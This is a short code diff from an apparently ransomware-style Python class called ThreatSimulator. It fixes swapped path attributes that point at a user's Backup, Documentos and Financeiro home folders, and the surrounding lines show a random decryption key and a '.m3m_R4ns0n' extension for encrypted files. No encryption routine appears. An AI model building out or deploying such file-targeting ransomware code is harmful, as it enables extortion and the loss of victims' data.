@@ -14,9 +14,9 @@ class ThreatSimulator:
     def __init__(self):
         self.decryption_key = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 30)))
         self.home_directory = os.path.expanduser("~")
-        self.documentos = os.path.join(self.home_directory, "Backup")
-        self.financeiro = os.path.join(self.home_directory, "Documentos")
-        self.backup = os.path.join(self.home_directory, "Financeiro")
+        self.backup = os.path.join(self.home_directory, "Backup")
+        self.documentos = os.path.join(self.home_directory, "Documentos")
+        self.financeiro = os.path.join(self.home_directory, "Financeiro")
         self.extension = ".m3m_R4ns0n"
 
     def generate_key(self, password: bytes) -> bytes:
